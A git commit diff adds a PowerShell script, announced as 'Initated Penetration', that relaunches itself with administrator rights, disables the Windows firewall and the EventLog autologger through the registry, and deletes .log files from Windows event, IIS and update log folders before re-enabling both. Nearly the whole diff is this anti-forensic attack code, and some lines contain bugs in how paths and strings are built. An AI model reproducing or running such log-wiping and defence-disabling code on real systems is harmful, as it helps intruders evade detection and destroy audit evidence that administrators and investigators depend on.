35865cab3103ee17b2bc35c47e3697a9552a94eb
Pragun Bajracharya <pragunbaj99@gmail.com>
2023-04-01 08:57:56 -0400

    Created functions to remove log files, disable firewalls, and disable eventlog service

--- main.ps1
+++ main.ps1
@@ -1,11 +1,78 @@
-Write-Output @"
-__/\\\\\\\\\\\\\______________/\\\_______________/\\\________/\\\\\\\\\\__        
- _\/\\\/////////\\\__________/\\\\\_____________/\\\\\______/\\\///////\\\_       
-  _\/\\\_______\/\\\________/\\\/\\\___________/\\\/\\\_____\///______/\\\__      
-   _\/\\\\\\\\\\\\\/_______/\\\/\/\\\_________/\\\/\/\\\____________/\\\//___     
-    _\/\\\/////////_______/\\\/__\/\\\_______/\\\/__\/\\\___________\////\\\__    
-     _\/\\\______________/\\\\\\\\\\\\\\\\__/\\\\\\\\\\\\\\\\___________\//\\\_   
-      _\/\\\_____________\///////////\\\//__\///////////\\\//___/\\\______/\\\__  
-       _\/\\\_______________________\/\\\______________\/\\\____\///\\\\\\\\\/___ 
-        _\///________________________\///_______________\///_______\/////////_____
-"@
+Function checkRunAsAdministrator()
+{
+  #Get current user context
+  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+  
+  #Check user is running the script is member of Administrator Group
+  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
+  {
+       return $true
+  }
+  else
+    {
+       #Create a new Elevated process to Start PowerShell
+       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
+ 
+       # Specify the current script path and name as a parameter
+       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
+ 
+       #Set the Process to elevated
+       $ElevatedProcess.Verb = "runas"
+ 
+       #Start the new elevated process
+       [System.Diagnostics.Process]::Start($ElevatedProcess)
+ 
+       #Exit from the current, unelevated, process
+       Exit
+ 
+    }
+}
+
+#check if a path exists
+Function checkIfFolderExists {
+     param(
+        [string]$FolderPath
+    )
+
+    if (Test-Path -Path $FolderPath) {
+        Write-Host "Folder " + $FolderPath + " exists."
+        return $true
+    }
+    Write-Host "Folder " + $FolderPath + " does not exists."
+    return $false
+}
+
+Function removeLogFilesFromAFolder {
+     param(
+        [string]$FolderPath
+    )
+
+    if(checkIfFolderExists -Folderpath $FolderPath) {
+        Write-Host "Initiaing file deletion on " + $FolderPath
+        Remove-Item $FolderPath + "\*.log"
+        Write-Host "File deleted from " + $FolderPath
+    }
+}
+ 
+#Check Script is running with Elevated Privileges
+if(checkRunAsAdministrator) {
+    Write-Host "Initated Penetration ..."
+
+    # Disabled Firewalld
+    Set-NetFirewallProfile -Enabled False
+
+    #Disabled the EventLog Service
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord
+
+    #Removed all the log files
+    removeLogFilesFromAFolder -Folderpath "C:\Logs"
+    removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
+    removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
+    removeLogFilesFromAFolder -Folderpath "%SystemRoot%\Logs\WindowsUpdate"
+
+    #Enabled Firewalld
+    Set-NetFirewallProfile -Enabled True
+
+    #Enabled the EventLog Service
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 1 -Type DWord
+}
